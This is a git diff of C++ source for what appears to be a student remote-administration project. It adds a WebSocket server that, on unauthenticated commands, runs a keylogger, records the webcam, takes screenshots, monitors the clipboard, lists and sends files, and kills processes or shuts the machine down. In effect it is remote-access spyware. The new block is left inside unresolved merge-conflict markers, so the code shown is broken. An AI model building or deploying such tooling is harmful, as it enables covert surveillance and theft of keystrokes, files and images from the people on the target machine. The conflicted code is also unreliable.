@@ -421,6 +421,21 @@ void RunAgent() {
                     std::string response = FileTransfer::HandleDownloadRequest(filepath);
                     ws.write(net::buffer(response));
                 }
+                else if (command == "ls" || command.rfind("ls ", 0) == 0) {
+                    std::string targetPath;
+
+                    if (command == "ls") {
+                        targetPath = "MyComputer";
+                    }
+                    else {
+                        targetPath = command.substr(3);
+                    }
+
+                    std::string result = FileTransfer::ListDirectory(targetPath);
+
+                    ws.text(true);
+                    ws.write(net::buffer(result));
+                    }
             }
         }
         catch (std::exception const& e) {
@@ -431,6 +446,273 @@ void RunAgent() {
     }
 }
 
+<<<<<<< HEAD
+=======
+void DoShutdown();
+void DoRestart();
+std::thread g_webcamThread;
+void fail(beast::error_code ec, char const* what) { std::cerr << what << ": " << ec.message() << "\n"; }
+
+// =============================================================
+// PHAN 2: XU LY KET NOI (SESSION)
+// =============================================================
+
+class session : public std::enable_shared_from_this<session> {
+    websocket::stream<beast::tcp_stream> ws_;
+    beast::flat_buffer buffer_;
+public:
+    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}
+    void run() {
+        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
+        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
+    }
+    void on_accept(beast::error_code ec) { if (ec) return fail(ec, "Accept Error"); do_read(); }
+    void do_read() { ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this())); }
+
+    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
+        boost::ignore_unused(bytes_transferred);
+        if (ec == websocket::error::closed) return;
+        if (ec) return fail(ec, "Read Error");
+
+        if (ws_.got_text()) {
+            std::string command = beast::buffers_to_string(buffer_.data());
+
+            static Keylogger myKeylogger;
+            static Process myProcessModule;
+            static Application myAppModule;
+            static Clipboard myClipboard;
+            // ---------------------------------------------------------
+            // [SECTION 1] SYSTEM INFO, PING, POWER
+            // ---------------------------------------------------------
+            if (command == "get-sys-info") {
+                std::string hostname = GetComputerNameStr();
+                std::string os = GetOSVersionStr();
+
+                std::string ramFree = GetRamFree();
+                std::string battery = GetBatteryStatus();
+                std::string diskFree = GetDiskFree();
+                std::string procCount = GetProcessCount();
+
+                std::string cpuUsage = GetCpuUsage();
+                std::string ramUsage = GetRamUsagePercent();
+
+                // Format: sys-info Host|OS|RAMFree|Battery|DiskFree|ProcessCount|CPU%|RAM%
+                std::string response = "sys-info " + hostname + "|" + os + "|" + ramFree + "|" + battery + "|" + diskFree + "|" + procCount + "|" + cpuUsage + "|" + ramUsage;
+
+                ws_.text(true);
+                ws_.write(net::buffer(response));
+            }
+            else if (command == "ping") {
+                ws_.text(true); ws_.write(net::buffer("pong"));
+            }
+            else if (command == "shutdown") {
+                ws_.text(true); ws_.write(net::buffer("Server: OK, shutting down in 15s...")); DoShutdown();
+            }
+            else if (command == "restart") {
+                ws_.text(true); ws_.write(net::buffer("Server: OK, restarting in 15s...")); DoRestart();
+            }
+
+            // ---------------------------------------------------------
+            // [SECTION 2] MEDIA (WEBCAM & SCREENSHOT)
+            // ---------------------------------------------------------
+            else if (command == "capture") {
+                if (g_webcamThread.joinable()) {
+                    ws_.text(true); ws_.write(net::buffer("Server: Busy recording..."));
+                }
+                else {
+                    ws_.text(true); ws_.write(net::buffer("Server: Started recording..."));
+                    auto self = shared_from_this();
+                    g_webcamThread = std::thread([self]() {
+                        std::vector<char> videoData = CaptureWebcam(10);
+                        if (!videoData.empty()) {
+                            std::string encoded = base64_encode(videoData);
+                            try { self->ws_.text(true); self->ws_.write(net::buffer("file " + encoded)); }
+                            catch (...) {}
+                        }
+                        });
+                    g_webcamThread.detach();
+                }
+            }
+            else if (command == "screenshot") {
+                ws_.text(true); ws_.write(net::buffer("Server: OK, capturing screenshot..."));
+                int width = GetSystemMetrics(SM_CXSCREEN);
+                int height = GetSystemMetrics(SM_CYSCREEN);
+                std::vector<std::uint8_t> pixels = ScreenShot();
+                if (pixels.empty()) {
+                    ws_.text(true); ws_.write(net::buffer("Server: Error capturing screenshot."));
+                }
+                else {
+                    std::vector<char> bytes(pixels.begin(), pixels.end());
+                    std::string encoded = base64_encode(bytes);
+                    std::string response = "screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded;
+                    ws_.text(true); ws_.write(net::buffer(response));
+                }
+            }
+
+            // ---------------------------------------------------------
+            // [SECTION 3] KEYLOGGER
+            // ---------------------------------------------------------
+            else if (command == "start-keylog") { myKeylogger.StartKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger started (background)...")); }
+            else if (command == "stop-keylog") { myKeylogger.StopKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger stopped.")); }
+            else if (command == "get-keylog") {
+                std::string logs = myKeylogger.GetLoggedKeys();
+                // Không cần check empty vì hàm GetLoggedKeys luôn trả về header MODE:...
+
+                // Gửi trực tiếp logs (đã có sẵn header MODE:...) để Client tự tách
+                ws_.text(true); ws_.write(net::buffer(logs));
+            }
+
+            // ---------------------------------------------------------
+            // [SECTION 4] PROCESS MANAGEMENT
+            // ---------------------------------------------------------
+            else if (command == "ps") {
+                std::string list = myProcessModule.ListProcesses();
+                ws_.text(true); ws_.write(net::buffer(list));
+            }
+            else if (command.rfind("start ", 0) == 0) {
+                std::string appName = command.substr(6);
+                if (myProcessModule.StartProcess(appName)) {
+                    ws_.text(true); ws_.write(net::buffer("Server: Started successfully: " + appName));
+                }
+                else {
+                    ws_.text(true); ws_.write(net::buffer("Server: Error! Could not start: " + appName));
+                }
+            }
+            else if (command.rfind("kill ", 0) == 0) {
+                std::string target = command.substr(5);
+                std::string result = myProcessModule.StopProcess(target);
+                ws_.text(true); ws_.write(net::buffer("Server: " + result));
+            }
+
+            // ---------------------------------------------------------
+            // [SECTION 5] APPLICATION MANAGEMENT
+            // ---------------------------------------------------------
+            else if (command == "list-app") {
+                myAppModule.LoadInstalledApps();
+
+                auto apps = myAppModule.ListApplicationsWithStatus();
+                ws_.text(true);
+                if (apps.empty()) ws_.write(net::buffer("Server: No apps found in Registry."));
+                else {
+                    std::string msg = "DANH SACH UNG DUNG\n";
+
+                    for (size_t i = 0; i < apps.size(); ++i) {
+                        msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
+                        msg += "Exe: " + apps[i].first.path + "\n";
+                    }
+                    ws_.write(net::buffer(msg));
+                }
+            }
+            else if (command.rfind("start-app ", 0) == 0) {
+                std::string input = command.substr(10);
+                bool ok = myAppModule.StartApplication(input);
+                ws_.text(true); ws_.write(net::buffer(ok ? "Server: Started " + input : "Server: Failed " + input));
+            }
+            else if (command.rfind("stop-app ", 0) == 0) {
+                std::string input = command.substr(9);
+                bool ok = myAppModule.StopApplication(input);
+                ws_.text(true); ws_.write(net::buffer(ok ? "Server: Stopped " + input : "Server: Failed stop " + input));
+            }
+            // ---------------------------------------------------------
+            // [SECTION 6] TEXT TO SPEECH (VUI NHON)
+            // ---------------------------------------------------------
+            else if (command.rfind("tts ", 0) == 0) {
+                // Cu phap: tts Hello Teacher
+                std::string textToSpeak = command.substr(4); // Cat bo chu "tts "
+
+                static TextToSpeech myTTS; // Khoi tao static de dung chung
+                myTTS.Speak(textToSpeak);
+
+                ws_.text(true);
+                ws_.write(net::buffer("Server: OK, speaking: \"" + textToSpeak + "\""));
+            }
+            // ---------------------------------------------------------
+            // [SECTION 7] CLIPBOARD MONITOR (THEO DÕI COPY/PASTE)
+            // ---------------------------------------------------------
+            else if (command == "start-clip") {
+                myClipboard.StartMonitoring();
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Clipboard Monitor STARTED (Background)..."));
+            }
+            else if (command == "stop-clip") {
+                myClipboard.StopMonitoring();
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Clipboard Monitor STOPPED."));
+            }
+            else if (command == "get-clip") {
+                std::string logs = myClipboard.GetLogs();
+                if (logs.empty()) logs = "[No clipboard data recorded]";
+
+                // Gửi dữ liệu về Client
+                ws_.text(true);
+                ws_.write(net::buffer("CLIPBOARD_DATA:\n" + logs));
+            }
+            // ---------------------------------------------------------
+            // [SECTION 8] FILE TRANSFER (DOWNLOAD FILE) 
+            // ---------------------------------------------------------
+            else if (command.rfind("download-file ", 0) == 0) {
+                std::string filepath = command.substr(14);
+
+                filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
+                filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
+
+                std::string response = FileTransfer::HandleDownloadRequest(filepath);
+
+                ws_.text(true);
+                ws_.write(net::buffer(response));
+
+                if (response.find("FILE_DOWNLOAD") == 0) {
+                    std::cout << "File sent successfully: " << filepath << "\n";
+                }
+                else {
+                    std::cout << "File send failed: " << filepath << "\n";
+                }
+            }
+            else if (command.rfind("ls ", 0) == 0) {
+                // Lệnh: ls <đường dẫn> (Ví dụ: ls D:\Data)
+                std::string path = command.substr(3);
+                std::string result = FileTransfer::ListDirectory(path);
+                ws_.text(true);
+                ws_.write(net::buffer(result));
+            }
+            else if (command == "ls") {
+                // Lệnh: ls (Mặc định lấy ổ C)
+                std::string result = FileTransfer::ListDirectory("C:\\");
+                ws_.text(true);
+                ws_.write(net::buffer(result));
+            }
+        }
+        buffer_.consume(buffer_.size());
+        do_read();
+    }
+};
+
+class listener : public std::enable_shared_from_this<listener> {
+    net::io_context& ioc_;
+    tcp::acceptor acceptor_;
+public:
+    listener(net::io_context& ioc, tcp::endpoint endpoint) : ioc_(ioc), acceptor_(ioc) {
+        beast::error_code ec;
+        acceptor_.open(endpoint.protocol(), ec);
+        if (ec) { fail(ec, "Open Error"); return; }
+        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
+        if (ec) { fail(ec, "Set Option Error"); return; }
+        acceptor_.bind(endpoint, ec);
+        if (ec) { fail(ec, "Bind Error"); return; }
+        acceptor_.listen(net::socket_base::max_listen_connections, ec);
+        if (ec) { fail(ec, "Listen Error"); return; }
+    }
+    void run() { do_accept(); }
+private:
+    void do_accept() { acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this())); }
+    void on_accept(beast::error_code ec, tcp::socket socket) {
+        if (ec) fail(ec, "Accept Error");
+        else std::make_shared<session>(std::move(socket))->run();
+        do_accept();
+    }
+};
+
+>>>>>>> 8b412ae054e6f54a216f30dc03a6528c766fc5ec
 int main() {
     // Cai dat DPI Aware
     SetProcessDPIAware();
